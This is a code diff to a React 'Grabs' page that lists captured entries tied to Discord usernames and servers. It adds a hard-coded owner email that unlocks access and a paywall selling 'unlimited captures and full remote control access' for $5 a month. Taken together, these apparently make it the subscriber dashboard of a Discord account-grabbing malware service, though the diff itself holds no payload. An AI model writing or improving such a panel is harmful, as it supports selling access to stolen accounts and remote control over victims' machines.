@@ -52,12 +52,12 @@ export default function GrabsPage() {
       .then(r => r.json())
       .then(d => {
         if (d.user?.email) {
-          setUserEmail(d.user.email);
-          if (d.user.email.toLowerCase() === 'lifegrading@gmail.com') {
+          const normEmail = d.user.email.toLowerCase().trim();
+          setUserEmail(normEmail);
+          if (normEmail === 'lifegrading@gmail.com') {
             setIsPro(true);
             setProChecked(true);
-            const url = '/api/grabs';
-            return fetch(url);
+            return fetch('/api/grabs');
           } else {
             return fetch('/api/user/pro?t=' + Date.now(), { cache: 'no-store' })
               .then(r => r.json())
@@ -66,7 +66,7 @@ export default function GrabsPage() {
                 setFreeUses(p.free_uses_remaining);
                 setTrialExhausted(p.trial_exhausted || false);
                 setProChecked(true);
-                const url = `/api/grabs?owner_email=${encodeURIComponent(d.user.email)}`;
+                const url = `/api/grabs?owner_email=${encodeURIComponent(normEmail)}`;
                 return fetch(url);
               })
               .catch(() => { setIsPro(false); setProChecked(true); return null; });
@@ -112,7 +112,7 @@ export default function GrabsPage() {
   }
 
   const isOwner = userEmail === 'lifegrading@gmail.com';
-  const canAccess = isPro || isOwner || freeUses > 0;
+  const canAccess = isPro || isOwner || (freeUses !== null && freeUses > 0);
 
   if (!canAccess && !isOwner) {
     return (
@@ -136,14 +136,23 @@ export default function GrabsPage() {
             <NavItem icon="🚪" label="Log out" onClick={() => window.location.href = '/api/auth/logout'} />
           </div>
         </aside>
-        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column', gap: 16 }}>
-          <div style={{ fontSize: 48 }}>🔒</div>
-          <div style={{ fontSize: 18, fontWeight: 600 }}>Free Trial Exhausted</div>
-          <div style={{ fontSize: 14, color: colors.textDim, textAlign: 'center', maxWidth: 400 }}>
-            You have used all 3 free captures. Upgrade to Pro for unlimited access to grabs and captures.
+        <div style={{ flex: 1, padding: '40px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
+          <div className="glass-card" style={{ maxWidth: 440, width: '100%', padding: '36px', borderRadius: 16, textAlign: 'center', border: '1px solid ' + colors.border }}>
+            <div style={{ fontSize: 48, marginBottom: 16 }}>🔒</div>
+            <h2 style={{ fontSize: 20, fontWeight: 700, margin: '0 0 8px 0', color: colors.text }}>Free Trial Exhausted</h2>
+            <p style={{ fontSize: 13, color: colors.textDim, margin: '0 0 24px 0', lineHeight: 1.5 }}>
+              You have used all your free trial captures. Upgrade to Pro for unlimited captures and full remote control access.
+            </p>
+            <button
+              onClick={() => router.push('/dashboard')}
+              style={{
+                width: '100%', padding: '12px 0', background: colors.green, color: '#000',
+                border: 'none', borderRadius: 8, fontSize: 14, fontWeight: 700, cursor: 'pointer'
+              }}
+            >
+              Upgrade to Pro ($5/mo)
+            </button>
           </div>
-          <button onClick={() => router.push('/dashboard')} style={{ cursor: 'pointer', background: colors.green, color: '#000', border: 'none', borderRadius: 8, padding: '10px 20px', fontSize: 13, fontWeight: 600 }}>Upgrade to Pro</button>
-          <div onClick={() => router.push('/dashboard')} style={{ cursor: 'pointer', color: colors.blue, fontSize: 14, marginTop: 8 }}>← Back to Dashboard</div>
         </div>
       </div>
     );
@@ -177,9 +186,17 @@ export default function GrabsPage() {
         <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 20 }}>
           <span style={{ fontSize: 24, fontWeight: 700 }}>Grabs</span>
           <span style={{ color: colors.textDim, fontSize: 14 }}>{grabs.length} captured</span>
-          {!isPro && !isOwner && freeUses !== null && freeUses !== undefined && (
-            <span style={{ color: colors.blue, fontSize: 12, background: 'rgba(59, 130, 246, 0.1)', padding: '2px 8px', borderRadius: 6 }}>
-              Free Trial: {freeUses} left
+          {isOwner ? (
+            <span style={{ color: colors.green, fontSize: 12, background: 'rgba(34, 197, 94, 0.1)', padding: '3px 10px', borderRadius: 6, fontWeight: 600 }}>
+              ⚡ OWNER
+            </span>
+          ) : isPro ? (
+            <span style={{ color: colors.green, fontSize: 12, background: 'rgba(34, 197, 94, 0.1)', padding: '3px 10px', borderRadius: 6, fontWeight: 600 }}>
+              👑 PRO (Unlimited)
+            </span>
+          ) : (
+            <span style={{ color: colors.blue, fontSize: 12, background: 'rgba(59, 130, 246, 0.1)', padding: '3px 10px', borderRadius: 6, fontWeight: 600 }}>
+              Free Trial: {freeUses !== null && freeUses !== undefined ? freeUses : 3} uses remaining
             </span>
           )}
         </div>
@@ -218,21 +235,15 @@ export default function GrabsPage() {
                   <div style={{ fontSize: 12, color: colors.textDim, marginTop: 2, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{g.discord_username}</div>
                 </div>
                 <div style={{ display: 'flex', alignItems: 'center', gap: 14, flexShrink: 0 }}>
-                  {g.servers && (
-                    <span style={{ fontSize: 12, color: colors.textDim, display: 'flex', alignItems: 'center', gap: 4 }}>
-                      🌐 {g.servers.split(',').filter(Boolean).length}
-                    </span>
-                  )}
-                  <span style={{ fontSize: 12, color: isUpdated ? '#f59e0b' : colors.textDim, whiteSpace: 'nowrap', fontWeight: isUpdated ? 600 : 400 }}>{formatTime(g.created_at, g.updated_at)}</span>
-                  <span style={{ color: '#444', fontSize: 14 }}>›</span>
+                  <span style={{ fontSize: 12, color: colors.textDim }}>{formatTime(g.created_at, g.updated_at)}</span>
+                  <span style={{ fontSize: 16, color: colors.textDim }}>→</span>
                 </div>
               </div>
             );
           })}
           {filtered.length === 0 && !loading && (
-            <div style={{ textAlign: 'center', color: colors.textDim, fontSize: 13, padding: 60 }}>
-              <div style={{ fontSize: 28, marginBottom: 8 }}>📭</div>
-              {grabs.length === 0 ? 'No grabs yet' : 'No grabs match your search'}
+            <div className="glass-card" style={{ padding: '60px', textAlign: 'center', color: colors.textDim, borderRadius: 12, fontSize: 13 }}>
+              No grabs found
             </div>
           )}
         </div>
